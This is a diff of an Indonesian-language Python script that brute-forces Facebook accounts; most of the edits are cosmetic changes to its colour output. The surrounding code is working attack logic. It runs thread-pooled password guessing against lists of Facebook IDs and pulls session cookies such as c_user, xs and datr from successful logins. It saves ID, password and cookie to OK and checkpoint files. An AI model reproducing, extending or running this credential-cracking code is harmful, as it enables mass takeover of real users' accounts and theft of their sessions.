@@ -860,7 +860,7 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack", width=90, padding=(0, 8), title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
+	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -935,8 +935,8 @@ def passwrd():
 	loading()
 	clear()
 	banner()
-	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !', style=f"bold purple"))
-	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !', style=f"bold purple"))
+	print(nel(f'                {M}!{H} PROSES CRACK SEDANG BERLANGSUNG{N}{M} !', style=f"bold purple"))
+	print(nel(f'               {M}!{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N}{M} !', style=f"bold purple"))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -976,7 +976,7 @@ def passwrd():
 			else:
 				pool.submit(crack,idf,pwv)
 				
-	cetak(nel('\t    [cyan][bold green] C)rack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
+	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
 	input(f'[{x}Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
@@ -1496,7 +1496,7 @@ def kontol(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {h}{thnb}{N}\n└──> UGENT : {u}{ua}{N} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> TAHUN : {h}{thnb}{N}\n└──> UGENT : {u}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1505,7 +1505,7 @@ def kontol(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {h}{thnb}{N}\n└──> UGENT : {u}{ua}{N} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> TAHUN : {h}{thnb}{N}\n└──> UGENT : {u}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1544,8 +1544,9 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
+	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}");loading();clear()
 	sys.stdout.flush()
+	clear()
 	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
@@ -1578,14 +1579,14 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
+				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──>  TAHUN : {B2}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
+				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──>  TAHUN : {H2}{thnb}{N}\n└──>  KUKIS : {H2}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {B2}{cka}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1598,8 +1599,9 @@ def crack2(idf,pwv):
 	pers = loop*100/len(id2)
 	fff = '%'
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
+	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}");loading();clear()
 	sys.stdout.flush()
+	clear()
 	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
 	ua = random.choice(ugen)
 	get = geturlm()
@@ -1669,7 +1671,7 @@ def crack2(idf,pwv):
 }
 			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
+				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H}{pw}{N}\n└──> TAHUN : {H2}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1678,7 +1680,7 @@ def crack2(idf,pwv):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
+				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──> TAHUN : {B2}{thnb}{N}\n└──>  KUKIS : {H2}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {B2}{cka}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			else:
